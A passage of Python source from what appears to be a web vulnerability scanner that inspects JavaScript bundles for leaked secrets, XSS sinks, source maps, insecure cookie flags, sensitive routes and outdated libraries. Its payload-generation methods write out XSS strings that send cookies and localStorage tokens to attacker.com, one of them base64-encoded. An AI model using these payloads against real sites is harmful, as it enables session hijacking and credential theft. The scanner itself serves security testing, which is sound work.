                title=f"Exposed {secret['type']}",
                description=(
                    f"Found in {secret['source']} (line ~{approx_line}): {raw_value}"
                ),
                phase=self.phase,
                recommendation=f"Remove this {secret['type']} from client-side code. Use environment variables and server-side proxying.",
                cvss_score=pattern_info.get("cvss", 6.0),
            )
            if hints:
                f.correlation_hints = hints
            findings.append(f)
            self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

            self.asset(
                asset_type=asset_type,
                path=f"{secret['type']}: {raw_value}",
                label=f"{file_name} (line ~{approx_line}) [{category.upper()}]",
                severity=pattern_info.get("severity", "high"),
                category=category,
            )

        if api_endpoints:
            sensitive_apis = []
            for ep in api_endpoints:
                for pattern in SENSITIVE_ENDPOINTS:
                    if re.search(pattern, ep, re.IGNORECASE):
                        sensitive_apis.append(ep)
                        break

            if sensitive_apis:
                f = Finding(
                    severity="medium",
                    title=f"Sensitive API Endpoints Exposed ({len(sensitive_apis)})",
                    description=f"Sensitive API endpoints discovered in network traffic: {'; '.join(sensitive_apis[:10])}",
                    phase=self.phase,
                    recommendation="Ensure all sensitive API endpoints require proper authentication and are not accessible from the client side without authorization.",
                    cvss_score=5.0,
                )
                findings.append(f)
                self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                for ep in sensitive_apis[:10]:
                    self.asset(
                        asset_type="endpoint",
                        path=ep,
                        label=f"Sensitive API endpoint discovered in JS",
                        severity="medium",
                        category="infra",
                    )

        if all_xss_findings:
            unique_xss = {}
            for xss in all_xss_findings:
                xss_key = f"{xss['label']}:{xss['file']}"
                if xss_key not in unique_xss:
                    unique_xss[xss_key] = xss

            for xss_key, xss in unique_xss.items():
                self.log(f"  XSS/INJECTION [{xss['severity'].upper()}]: {xss['label']} in {xss['file']} (line ~{xss['line']})", "warn")
                f = Finding(
                    severity=xss["severity"],
                    title=f"Client-Side Injection Risk: {xss['label']}",
                    description=(
                        f"Detected in {xss['file']} at line ~{xss['line']}. "
                        f"Pattern: {xss['snippet'][:120]}"
                    ),
                    phase=self.phase,
                    recommendation="Sanitize all dynamic content before DOM insertion. Use textContent instead of innerHTML. Avoid eval() and new Function() with user input.",
                    cvss_score=xss["cvss"],
                )
                findings.append(f)
                self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                self.asset(
                    asset_type="secret",
                    path=xss["snippet"][:80],
                    label=f"Injection: {xss['label'][:60]} in {xss['file']} (line ~{xss['line']})",
                    severity=xss["severity"],
                    category="injection",
                )

            self._emit_injection_payloads(unique_xss)

            self.log(f"XSS/Injection analysis complete — {len(unique_xss)} unique patterns found across {scanned} files", "warn")

        if source_map_findings:
            for sm in source_map_findings:
                self.log(f"  SOURCE MAP [{sm['severity'].upper()}]: {sm['map_url']} ({sm['size_kb']} KB)", "warn")

                recon_info = sm.get("reconstruction", {})
                recon_desc = ""
                if recon_info:
                    src_count = recon_info.get("sources_count", 0)
                    src_sample = recon_info.get("sources_sample", [])
                    recon_desc = (
                        f"\nSource reconstruction: {src_count} original source files mapped. "
                        f"Sample paths: {', '.join(src_sample[:5])}"
                    )

                f = Finding(
                    severity=sm["severity"],
                    title=f"Source Map Accessible: {sm['file_name']}.map",
                    description=(
                        f"Source map file accessible at {sm['map_url']} ({sm['size_kb']} KB). "
                        f"This exposes the original unminified source code, revealing internal logic, "
                        f"variable names, API routes, comments, and potentially sensitive business logic."
                        f"{recon_desc}"
                    ),
                    phase=self.phase,
                    recommendation="Remove source map files from production deployments. Configure your bundler (Webpack/Vite/Rollup) to not generate source maps for production builds.",
                    cvss_score=sm["cvss"],
                )
                findings.append(f)
                self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                self.asset(
                    asset_type="file",
                    path=sm["map_url"],
                    label=f"Source map ({sm['size_kb']} KB) — exposes original source code",
                    severity=sm["severity"],
                    category="sourcemap",
                )

                if recon_info:
                    for src_path in recon_info.get("sources_sample", [])[:5]:
                        self.asset(
                            asset_type="file",
                            path=src_path,
                            label=f"Reconstructed source file from {sm['file_name']}.map",
                            severity="medium",
                            category="sourcemap",
                        )

            self.log(f"Source map audit complete — {len(source_map_findings)} accessible .map files found", "warn")

        cookie_findings = await self._audit_cookies(job)
        findings.extend(cookie_findings)

        all_discovered_endpoints = []
        if api_endpoints:
            all_discovered_endpoints.extend(api_endpoints)
        for fname, content in file_contents.items():
            all_discovered_endpoints.extend(self._find_endpoints(content))

        self.log("━━━ ENTERPRISE ROUTE INTELLIGENCE ━━━", "info")
        enterprise_findings = self._scan_enterprise_routes(file_contents, all_discovered_endpoints)
        findings.extend(enterprise_findings)

        self.log("━━━ FRAMEWORK VERSION DETECTION ━━━", "info")
        framework_findings = self._scan_framework_versions(file_contents)
        findings.extend(framework_findings)

        self.log(
            f"JS secrets scan complete — {scanned} files scanned, "
            f"{len(unique_secrets)} unique secrets found, "
            f"{len(enterprise_findings)} enterprise routes analyzed, "
            f"{len(framework_findings)} framework versions detected, "
            f"{len(findings)} total findings",
            "success" if not unique_secrets else "warn",
        )

        self.log(f"Exposed assets repository: {len(unique_secrets)} secrets, {len(unique_xss) if all_xss_findings else 0} injection vectors, {len(source_map_findings)} source maps, {len(enterprise_findings)} enterprise routes emitted to Utils/Exposed")
        return findings

    def _sort_priority_files(self, js_files: list) -> list:
        priority = []
        rest = []
        for url in js_files:
            file_name = urlparse(url).path.split("/")[-1] or ""
            base_name = re.sub(r'\.[a-f0-9]{6,}\.', '.', file_name)
            if any(p in base_name.lower() for p in PRIORITY_JS_FILES):
                priority.append(url)
            else:
                rest.append(url)
        return priority + rest

    def _scan_content(self, content: str, source: str, file_name: str = "") -> list:
        secrets = []
        lines_map = self._build_line_map(content)
        active = getattr(self, "_active_patterns", SECRET_PATTERNS)
        for secret_type, config in active.items():
            try:
                matches = re.finditer(config["pattern"], content, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    value = match.group(1) if match.lastindex else match.group(0)
                    if not self._is_false_positive(value, secret_type):
                        approx_line = self._get_line_number(lines_map, match.start())
                        secrets.append({
                            "type": secret_type,
                            "match": value,
                            "source": source,
                            "position": match.start(),
                            "file_name": file_name or source,
                            "approx_line": approx_line,
                        })
                        self.log(
                            f"  SECRET FOUND [{config.get('severity', 'high').upper()}]: {secret_type} in {source} (line ~{approx_line})",
                            "error" if config.get("severity") in ("critical", "high") else "warn",
                        )
            except re.error:
                pass
        return secrets

    def _scan_xss_patterns(self, content: str, file_name: str) -> list:
        hits = []
        lines_map = self._build_line_map(content)
        for xss_def in XSS_INJECTION_PATTERNS:
            try:
                for match in re.finditer(xss_def["pattern"], content, re.IGNORECASE):
                    line_num = self._get_line_number(lines_map, match.start())
                    snippet_start = max(0, match.start() - 20)
                    snippet_end = min(len(content), match.end() + 40)
                    snippet = content[snippet_start:snippet_end].replace("\n", " ").strip()
                    hits.append({
                        "label": xss_def["label"],
                        "file": file_name,
                        "line": line_num,
                        "severity": xss_def["severity"],
                        "cvss": xss_def["cvss"],
                        "snippet": snippet,
                    })
            except re.error:
                pass
        return hits

    async def _check_source_map(self, client: httpx.AsyncClient, js_url: str, file_name: str, content: str = "") -> list:
        results = []
        checked_urls = set()

        map_urls_to_check = [js_url + ".map"]
        if content:
            refs = re.findall(r"//[#@]\s*sourceMappingURL\s*=\s*(\S+)", content)
            for ref in refs:
                if ref.startswith("data:"):
                    continue
                full_url = urljoin(js_url, ref)
                if full_url not in checked_urls:
                    map_urls_to_check.insert(0, full_url)

        for map_url in map_urls_to_check:
            if map_url in checked_urls:
                continue
            checked_urls.add(map_url)
            try:
                resp = await client.head(map_url, follow_redirects=True)
                if resp.status_code == 200:
                    content_length = int(resp.headers.get("content-length", 0))
                    size_kb = round(content_length / 1024, 1) if content_length else 0
                    map_body = None
                    if size_kb == 0:
                        get_resp = await client.get(map_url, follow_redirects=True)
                        if get_resp.status_code == 200 and len(get_resp.content) > 100:
                            size_kb = round(len(get_resp.content) / 1024, 1)
                            map_body = get_resp.text
                        else:
                            continue

                    reconstruction = {}
                    if size_kb <= 2048:
                        try:
                            if not map_body:
                                get_resp = await client.get(map_url, follow_redirects=True)
                                if get_resp.status_code == 200:
                                    map_body = get_resp.text
                            if map_body:
                                import json as _json
                                map_data = _json.loads(map_body)
                                sources = map_data.get("sources", [])
                                if sources:
                                    reconstruction = {
                                        "sources_count": len(sources),
                                        "sources_sample": [s for s in sources[:10] if s],
                                        "has_contents": "sourcesContent" in map_data,
                                        "version": map_data.get("version", "?"),
                                    }
                                    self.log(
                                        f"  SOURCE MAP RECON: {len(sources)} source files mapped from {file_name}.map",
                                        "warn",
                                    )
                        except Exception:
                            pass

                    severity = "high" if size_kb > 500 else "medium"
                    results.append({
                        "map_url": map_url,
                        "file_name": file_name,
                        "size_kb": size_kb,
                        "severity": severity,
                        "cvss": 6.5 if severity == "high" else 5.0,
                        "reconstruction": reconstruction,
                    })
            except Exception:
                pass
        return results

    async def _audit_cookies(self, job) -> list:
        findings = []
        cookies_data = getattr(job, "_cookies", None)

        if cookies_data is None:
            self.log("Auditing cookies via HTTP response headers...")
            try:
                async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as client:
                    resp = await client.get(job.base_url)
                    set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, 'get_list') else [v for k, v in resp.headers.multi_items() if k.lower() == "set-cookie"]

                    if not set_cookie_headers:
                        self.log("No Set-Cookie headers found in HTTP response")
                        return findings

                    hijack_risk = []
                    for sc in set_cookie_headers:
                        sc_lower = sc.lower()
                        cookie_name = sc.split("=")[0].strip()
                        issues = []

                        session_keywords = ["session", "sid", "ssid", "auth", "token", "jwt", "login", "user", "csrf", "xsrf"]
                        is_session = any(kw in cookie_name.lower() for kw in session_keywords)

                        if "httponly" not in sc_lower:
                            issues.append("missing HttpOnly")
                        if "secure" not in sc_lower:
                            issues.append("missing Secure")
                        if "samesite" not in sc_lower:
                            issues.append("missing SameSite")
                        elif "samesite=none" in sc_lower:
                            issues.append("SameSite=None")

                        if issues:
                            hijack_risk.append({
                                "name": cookie_name,
                                "issues": issues,
                                "is_session": is_session,
                            })

                    session_vulns = [c for c in hijack_risk if c["is_session"]]
                    if session_vulns:
                        detail_lines = []
                        for c in session_vulns:
                            detail_lines.append(f"  {c['name']}: {', '.join(c['issues'])}")
                        desc = "Session cookies vulnerable to hijacking:\n" + "\n".join(detail_lines)
                        f = Finding(
                            severity="high",
                            title=f"Session Hijacking Vulnerability ({len(session_vulns)} session cookies)",
                            description=desc,
                            phase=self.phase,
                            recommendation="Set HttpOnly, Secure, and SameSite=Strict on all session cookies to prevent session hijacking via XSS and CSRF.",
                            cvss_score=7.5,
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                        self.log(f"  COOKIE AUDIT [HIGH]: {len(session_vulns)} session cookies missing security flags", "error")

                        for c in session_vulns:
                            self.asset(
                                asset_type="config",
                                path=f"{c['name']} cookie",
                                label=f"Session Hijacking: {', '.join(c['issues'])}",
                                severity="high",
                                category="session",
                            )

                        self._emit_session_payloads(session_vulns)

                    other_vulns = [c for c in hijack_risk if not c["is_session"]]
                    if other_vulns:
                        detail_lines = [f"  {c['name']}: {', '.join(c['issues'])}" for c in other_vulns[:10]]
                        desc = "Non-session cookies with insecure flags:\n" + "\n".join(detail_lines)
                        f = Finding(
                            severity="low",
                            title=f"Insecure Cookie Flags ({len(other_vulns)} cookies)",
                            description=desc,
                            phase=self.phase,
                            recommendation="Set Secure and SameSite attributes on all cookies.",
                            cvss_score=3.0,
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                    self.log(f"Cookie audit complete — {len(set_cookie_headers)} cookies analyzed, {len(hijack_risk)} with issues")
            except Exception as e:
                self.log(f"Cookie audit error: {str(e)}", "warn")
        else:
            hijack_risk = []
            session_keywords = ["session", "sid", "ssid", "auth", "token", "jwt", "login", "user", "csrf", "xsrf"]
            for cookie in cookies_data:
                cookie_name = cookie.get("name", "")
                is_session = any(kw in cookie_name.lower() for kw in session_keywords)
                issues = []
                if not cookie.get("httpOnly"):
                    issues.append("missing HttpOnly")
                if not cookie.get("secure"):
                    issues.append("missing Secure")
                same_site = cookie.get("sameSite", "")
                if not same_site or same_site.lower() == "none":
                    issues.append(f"SameSite={same_site or 'not set'}")

                if issues:
                    hijack_risk.append({"name": cookie_name, "issues": issues, "is_session": is_session})

            session_vulns = [c for c in hijack_risk if c["is_session"]]
            if session_vulns:
                detail_lines = [f"  {c['name']}: {', '.join(c['issues'])}" for c in session_vulns]
                f = Finding(
                    severity="high",
                    title=f"Session Hijacking Vulnerability ({len(session_vulns)} session cookies)",
                    description="Session cookies vulnerable to hijacking:\n" + "\n".join(detail_lines),
                    phase=self.phase,
                    recommendation="Set HttpOnly, Secure, and SameSite=Strict on all session cookies.",
                    cvss_score=7.5,
                )
                findings.append(f)
                self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                self.log(f"  COOKIE AUDIT [HIGH]: {len(session_vulns)} session cookies missing security flags", "error")

                for c in session_vulns:
                    self.asset(
                        asset_type="config",
                        path=f"{c['name']} cookie",
                        label=f"Session Hijacking: {', '.join(c['issues'])}",
                        severity="high",
                        category="session",
                    )

                self._emit_session_payloads(session_vulns)

            self.log(f"Cookie audit complete — {len(cookies_data)} cookies analyzed, {len(hijack_risk)} with issues")

        return findings

    def _build_line_map(self, content: str) -> list:
        positions = [0]
        idx = 0
        while True:
            idx = content.find("\n", idx)
            if idx == -1:
                break
            idx += 1
            positions.append(idx)
        return positions

    def _get_line_number(self, lines_map: list, position: int) -> int:
        lo, hi = 0, len(lines_map) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            if lines_map[mid] <= position:
                lo = mid + 1
            else:
                hi = mid - 1
        return lo

    def _find_endpoints(self, content: str) -> list:
        endpoints = []
        url_patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/graphql[^"\']*)["\']',
            r'["\'](https?://[^"\']+/api/[^"\']+)["\']',
            r'fetch\s*\(\s*["\']([^"\']+)["\']',
            r'axios\.\w+\s*\(\s*["\']([^"\']+)["\']',
            r'\.get\s*\(\s*["\']([^"\']+)["\']',
            r'\.post\s*\(\s*["\']([^"\']+)["\']',
        ]
        for pattern in url_patterns:
            try:
                for match in re.finditer(pattern, content):
                    ep = match.group(1)
                    if len(ep) > 3 and not ep.startswith("data:"):
                        endpoints.append(ep)
            except re.error:
                pass
        return list(set(endpoints))

    def _is_false_positive(self, value: str, secret_type: str) -> bool:
        if not value or len(value) < 6:
            return True
        for fp_pattern in FALSE_POSITIVE_PATTERNS:
            if re.match(fp_pattern, value, re.IGNORECASE):
                return True
        if secret_type == "Generic Password Assignment":
            if len(set(value)) < 3:
                return True
        return False

    def _emit_injection_payloads(self, unique_xss: dict):
        payload_map = {
            "innerhtml": {
                "payload": '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
                "label": "innerHTML XSS payload — cookie exfiltration via onerror",
            },
            "eval": {
                "payload": "eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tLz9jPScrZG9jdW1lbnQuY29va2llKQ=='))",
                "label": "eval() payload — base64-encoded cookie exfiltration",
            },
            "document.write": {
                "payload": 'document.write(\'<script src="https://attacker.com/hook.js"></script>\')',
                "label": "document.write payload — remote script injection",
            },
            "new function": {
                "payload": "new Function('return fetch(\"//attacker.com/?t=\"+localStorage.getItem(\"token\"))')();",
                "label": "new Function() payload — localStorage token theft",
            },
            "dangerouslysetinnerhtml": {
                "payload": '{__html: \'<img src=x onerror="new Image().src=`//attacker.com/?c=${document.cookie}`">\'}',
                "label": "React dangerouslySetInnerHTML payload — cookie exfiltration",
            },
            "postmessage": {
                "payload": "window.postMessage({type:'auth',token:document.cookie},'*')",
                "label": "postMessage payload — cross-origin cookie broadcast",
            },
            "url concatenation": {
                "payload": "/api/redirect?next=javascript:alert(document.cookie)//",
                "label": "URL injection payload — javascript: protocol redirect",
            },
        }

        emitted = set()
        for xss_key, xss in unique_xss.items():
            label_lower = xss["label"].lower()
            for trigger, info in payload_map.items():
                if trigger in label_lower and trigger not in emitted:
                    emitted.add(trigger)
                    self.asset(
                        asset_type="secret",
                        path=info["payload"][:100],
                        label=f"Payload: {info['label']}",
                        severity="high",
                        category="injection",
                    )
                    self.log(f"  PAYLOAD GEN [{trigger.upper()}]: {info['label']}", "warn")

    def _emit_session_payloads(self, session_vulns: list):
        cookie_names = [c["name"] for c in session_vulns]
        names_str = ", ".join(cookie_names[:3])

        payloads = [
            {
                "payload": f"<script>new Image().src='//attacker.com/grab?c='+document.cookie</script>",
                "label": f"Cookie capture: grabs {names_str} via Image beacon (no HttpOnly)",
            },
            {
                "payload": f"<script>fetch('//attacker.com/log',{{method:'POST',body:JSON.stringify({{cookies:document.cookie,storage:JSON.stringify(localStorage)}})}});</script>",
                "label": f"Full exfiltration: cookies + localStorage via fetch POST",
            },
        ]

        no_secure = [c["name"] for c in session_vulns if "missing Secure" in ", ".join(c["issues"])]
        if no_secure:
            payloads.append({
                "payload": f"# MitM: cookies [{', '.join(no_secure[:2])}] transmit over HTTP — interceptable on open WiFi",
                "label": f"Network capture: {', '.join(no_secure[:2])} sent over cleartext HTTP",
            })

        for p in payloads:
            self.asset(
                asset_type="secret",
                path=p["payload"][:100],
                label=f"Session Payload: {p['label']}",
                severity="high",
                category="session",
            )
        self.log(f"  SESSION PAYLOADS: {len(payloads)} capture scripts generated for {len(session_vulns)} vulnerable cookies", "warn")

    def _scan_enterprise_routes(self, file_contents: dict, all_endpoints: list) -> list:
        findings = []
        all_content = "\n".join(file_contents.values())
        combined_endpoints = "\n".join(all_endpoints) if all_endpoints else ""
        search_corpus = all_content + "\n" + combined_endpoints

        detected_routes = {}
        redis_detected = False

        for redis_pat in REDIS_INFRA_PATTERNS:
            if re.search(redis_pat["pattern"], all_content, re.IGNORECASE):
                redis_detected = True
                self.log(f"  \033[35mREDIS INFRA [{redis_pat['label']}]\033[0m — Privilege escalation vector identified", "warn")
                self.asset(
                    asset_type="config",
                    path=f"Redis: {redis_pat['label']}",
                    label=f"Infrastructure: {redis_pat['label']} — data store manipulation risk",
                    severity="critical",
                    category="infra",
                )
                break

        for sector, config in ENTERPRISE_ROUTE_REGISTRY.items():
            sector_label = config["label"]
            sector_severity = config["severity"]
            sector_cvss = config["cvss"]

            for route_def in config["routes"]:
                route_path = route_def["path"]
                escaped = re.escape(route_path)
                flexible_pattern = escaped.replace(r"/", r"[/\\]?")
                if re.search(flexible_pattern, search_corpus, re.IGNORECASE):
                    route_key = f"{sector}:{route_path}"
                    if route_key in detected_routes:
                        continue
                    detected_routes[route_key] = route_def

                    file_found_in = "JS bundle"
                    for fname, content in file_contents.items():
                        if re.search(flexible_pattern, content, re.IGNORECASE):
                            file_found_in = fname
                            break

                    severity = sector_severity
                    if route_def["manipulation"]:
                        severity = "critical"

                    self.log(
                        f"  \033[35m{sector_label} ROUTE [{severity.upper()}]: {route_path}\033[0m — {route_def['label']} in {file_found_in}",
                        "error" if severity == "critical" else "warn",
                    )

                    f = Finding(
                        severity=severity,
                        title=f"Enterprise Route Exposed: {route_path} [{sector_label}]",
                        description=(
                            f"Detected {sector_label} route '{route_path}' ({route_def['label']}) in {file_found_in}. "
                            f"Sector: {sector.upper()}. "
                            f"{'No visible authentication guard on this endpoint.' if route_def['manipulation'] else 'Endpoint discovered in client JS — verify server-side auth.'}"
                        ),
                        phase=self.phase,
                        recommendation=f"Ensure {route_path} requires server-side authentication, rate limiting, and audit logging. Remove route references from client-side bundles.",
                        cvss_score=sector_cvss,
                    )
                    findings.append(f)
                    self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                    self.asset(
                        asset_type="endpoint",
                        path=route_path,
                        label=f"[{sector_label}] {route_def['label']} — {file_found_in}",
                        severity=severity,
                        category=sector if sector != "products" else "ecommerce",
                    )

                    if route_def["manipulation"] and route_def["manipulation"] in MANIPULATION_PAYLOADS:
                        manip = MANIPULATION_PAYLOADS[route_def["manipulation"]]
                        self.log(
                            f"  \033[95mPAYLOAD GEN [{sector_label}]: {manip['label']}\033[0m — {manip['description'][:80]}",
                            "warn",
                        )

                        self.asset(
                            asset_type="secret",
                            path=manip["payload"][:100],
                            label=f"PoC: {manip['label']} → {route_path}",
                            severity="critical" if sector in ("fintech", "government") else "high",
                            category=sector if sector != "products" else "ecommerce",
                        )

                        f_poc = Finding(
                            severity="critical" if sector in ("fintech", "government") else "high",
                            title=f"Manipulation Vector: {manip['label']}",
                            description=(
                                f"Attack PoC for {route_path}:\n"
                                f"{manip['description']}\n"
                                f"Payload: {manip['payload'][:200]}"
                            ),
                            phase=self.phase,
                            recommendation=f"Implement server-side validation, HMAC signature verification, and idempotency keys on {route_path}. Never trust client-submitted price/discount/status values.",
                            cvss_score=sector_cvss,
                        )
                        findings.append(f_poc)
                        self.finding(f_poc.severity, f_poc.title, f_poc.description, f_poc.recommendation, f_poc.cvss_score)

        if redis_detected and detected_routes:
            escalation_sectors = set()
            for rk in detected_routes:
                sector = rk.split(":")[0]
                escalation_sectors.add(sector)
            sectors_str = ", ".join(s.upper() for s in escalation_sectors)
            self.log(
                f"  \033[95mPRIVILEGE ESCALATION\033[0m: Redis infra + {len(detected_routes)} enterprise routes ({sectors_str}) — direct data store manipulation possible",
                "error",
            )
            f_esc = Finding(
                severity="critical",
                title=f"Privilege Escalation: Redis + Enterprise Routes ({sectors_str})",
                description=(
                    f"Redis infrastructure detected alongside {len(detected_routes)} enterprise routes spanning {sectors_str}. "
                    f"An attacker with Redis access could directly manipulate cached prices, session data, coupon validation results, "
                    f"or transaction states, bypassing all application-layer security controls."
                ),
                phase=self.phase,
                recommendation="Isolate Redis behind VPC, require AUTH, disable dangerous commands (FLUSHALL, CONFIG SET, DEBUG), and implement application-level integrity checks.",
                cvss_score=9.8,
            )
            findings.append(f_esc)
            self.finding(f_esc.severity, f_esc.title, f_esc.description, f_esc.recommendation, f_esc.cvss_score)

            self.asset(
                asset_type="config",
                path="Redis + Enterprise Routes",
                label=f"Privilege Escalation: direct data store manipulation across {sectors_str}",
                severity="critical",
                category="infra",
            )

        if detected_routes:
            self.log(
                f"  \033[35mENTERPRISE ROUTE SCAN COMPLETE\033[0m: {len(detected_routes)} routes detected, "
                f"{sum(1 for r in detected_routes.values() if r['manipulation'])} manipulation vectors, "
                f"{sum(1 for r in detected_routes.values() if r['manipulation'] and r['manipulation'] in MANIPULATION_PAYLOADS)} PoC payloads generated",
                "warn",
            )

        return findings

    def _scan_framework_versions(self, file_contents: dict) -> list:
        FRAMEWORK_PATTERNS = {
            "React": [
                r"react@(\d+\.\d+\.\d+)",
                r"react-dom@(\d+\.\d+\.\d+)",
                r"react\.production\.min\.js.*?(\d+\.\d+\.\d+)",
                r"react/cjs/react\.production.*?(\d+\.\d+\.\d+)",
            ],
            "Vue": [
                r"vue@(\d+\.\d+\.\d+)",
                r"Vue\.js\s+v(\d+\.\d+\.\d+)",
                r"vue\.runtime\.esm.*?(\d+\.\d+\.\d+)",
            ],
            "Angular": [
                r"@angular/core@(\d+\.\d+\.\d+)",
                r"angular\.js/(\d+\.\d+\.\d+)",
                r"angular\.min\.js/(\d+\.\d+\.\d+)",
            ],
            "jQuery": [
                r"jquery/(\d+\.\d+\.\d+)",
                r"jQuery\s+v(\d+\.\d+\.\d+)",
                r"jquery@(\d+\.\d+\.\d+)",
                r"jquery\.min\.js\?v=(\d+\.\d+\.\d+)",
                r"jquery-(\d+\.\d+\.\d+)",
            ],
            "Bootstrap": [
                r"bootstrap@(\d+\.\d+\.\d+)",
                r"Bootstrap\s+v(\d+\.\d+\.\d+)",
                r"bootstrap/(\d+\.\d+\.\d+)",
            ],
            "Lodash": [
                r"lodash@(\d+\.\d+\.\d+)",
                r"lodash\.js/(\d+\.\d+\.\d+)",
                r"lodash/(\d+\.\d+\.\d+)",
            ],
            "Axios": [
                r"axios/(\d+\.\d+\.\d+)",
                r"axios@(\d+\.\d+\.\d+)",
            ],
            "Moment.js": [
                r"moment@(\d+\.\d+\.\d+)",
                r"moment\.js/(\d+\.\d+\.\d+)",
                r"momentjs\.com.*?(\d+\.\d+\.\d+)",
            ],
            "Next.js": [
                r"next@(\d+\.\d+\.\d+)",
                r"__NEXT_DATA__",
            ],
        }

        KNOWN_CVES = {
            "jQuery": [
                {"version_below": "3.5.0", "cve": "CVE-2020-11022", "severity": "high", "cvss": 6.1, "description": "XSS vulnerability in jQuery.htmlPrefilter regex"},
                {"version_below": "3.0.0", "cve": "CVE-2015-9251", "severity": "medium", "cvss": 6.1, "description": "XSS vulnerability when performing cross-domain Ajax requests"},
            ],
            "Angular": [
                {"version_below": "1.6.9", "cve": "CVE-2019-10768", "severity": "high", "cvss": 7.5, "description": "Prototype pollution via merge function in AngularJS"},
            ],
            "Lodash": [
                {"version_below": "4.17.21", "cve": "CVE-2021-23337", "severity": "high", "cvss": 7.2, "description": "Command injection via template function in Lodash"},
            ],
            "Moment.js": [
                {"version_below": "2.29.4", "cve": "CVE-2022-31129", "severity": "high", "cvss": 7.5, "description": "ReDoS vulnerability in moment duration parsing"},
            ],
            "Bootstrap": [
                {"version_below": "3.4.0", "cve": "CVE-2018-14040", "severity": "medium", "cvss": 6.1, "description": "XSS vulnerability in Bootstrap collapse and tooltip data attributes"},
            ],
            "React": [
                {"version_below": "16.0.0", "cve": "CVE-2018-6341", "severity": "high", "cvss": 6.1, "description": "XSS vulnerability in server-side rendered React applications"},
            ],
        }

        def _parse_version(v_str):
            try:
                return tuple(int(x) for x in v_str.split("."))
            except (ValueError, AttributeError):
                return None

        def _version_below(detected, threshold):
            d = _parse_version(detected)
            t = _parse_version(threshold)
            if not d or not t:
                return False
            for dv, tv in zip(d, t):
                if dv < tv:
                    return True
                if dv > tv:
                    return False
            return False

        findings = []
        all_content = "\n".join(file_contents.values())
        detected_frameworks = {}

        for framework, patterns in FRAMEWORK_PATTERNS.items():
            for pattern in patterns:
                try:
                    matches = re.findall(pattern, all_content, re.IGNORECASE)
                    for match in matches:
                        if match and re.match(r"\d+\.\d+\.\d+", match):
                            if framework not in detected_frameworks:
                                detected_frameworks[framework] = match
                            break
                except re.error:
                    pass
                if framework in detected_frameworks:
                    break

            if framework == "Next.js" and framework not in detected_frameworks:
                if "__NEXT_DATA__" in all_content:
                    detected_frameworks[framework] = "detected"

        for framework, version in detected_frameworks.items():
            self.log(f"  FRAMEWORK DETECTED: {framework} {version}")

            has_cve = False
            if framework in KNOWN_CVES and version != "detected":
                for cve_info in KNOWN_CVES[framework]:
                    if _version_below(version, cve_info["version_below"]):
                        has_cve = True
                        self.log(
                            f"  CVE MATCH [{cve_info['severity'].upper()}]: {framework} {version} < {cve_info['version_below']} — {cve_info['cve']}: {cve_info['description']}",
                            "error",
                        )
                        f = Finding(
                            severity=cve_info["severity"],
                            title=f"Outdated {framework} {version} — {cve_info['cve']} ({cve_info['description'][:40]})",
                            description=(
                                f"Detected {framework} version {version} which is below {cve_info['version_below']}. "
                                f"This version is affected by {cve_info['cve']}: {cve_info['description']}. "
                                f"Upgrade to the latest version to mitigate this vulnerability."
                            ),
                            phase=self.phase,
                            recommendation=f"Upgrade {framework} to the latest stable version (at minimum above {cve_info['version_below']}).",
                            cvss_score=cve_info["cvss"],
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                        self.asset(
                            asset_type="config",
                            path=f"{framework}@{version}",
                            label=f"Vulnerable: {cve_info['cve']} — {cve_info['description'][:60]}",
                            severity=cve_info["severity"],
                            category="framework",
                        )

            if not has_cve:
                f = Finding(
                    severity="info",
                    title=f"Framework Detected: {framework} {version}",
                    description=f"Detected {framework} version {version} in client-side JavaScript. No known CVEs matched for this version.",
                    phase=self.phase,
                    recommendation="Keep frameworks up to date and monitor for new CVE disclosures.",
                    cvss_score=0.0,
                )
                findings.append(f)
                self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)

                self.asset(
                    asset_type="config",
                    path=f"{framework}@{version}",
                    label=f"Framework: {framework} {version} (no known CVEs)",
                    severity="info",
                    category="framework",
                )

        if detected_frameworks:
            self.log(
                f"  FRAMEWORK SCAN COMPLETE: {len(detected_frameworks)} frameworks detected, "
                f"{len(findings) - len(detected_frameworks) + sum(1 for f in findings if 'no known CVEs' not in f.description)} CVE matches",
                "warn" if any(f.severity in ("high", "critical") for f in findings) else "info",
            )

        return findings

    async def _fallback_discover(self, job) -> tuple:
        js_files = []
        inline_scripts = []
        try:
            async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as client:
                resp = await client.get(job.base_url)
                if resp.status_code == 200:
                    html = resp.text
                    src_matches = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
                    for src in src_matches:
                        full_url = urljoin(job.base_url, src)
                        js_files.append(full_url)
                    inline_matches = re.findall(
                        r'<script(?:\s[^>]*)?>(.+?)</script>',
                        html,
                        re.DOTALL | re.IGNORECASE,
                    )
                    for content in inline_matches:
                        if len(content.strip()) > 10:
                            inline_scripts.append(content)
                    self.log(f"Fallback discovery: {len(js_files)} JS files, {len(inline_scripts)} inline scripts")
        except Exception as e:
            self.log(f"Fallback discovery failed: {str(e)}", "error")
        return js_files, inline_scripts
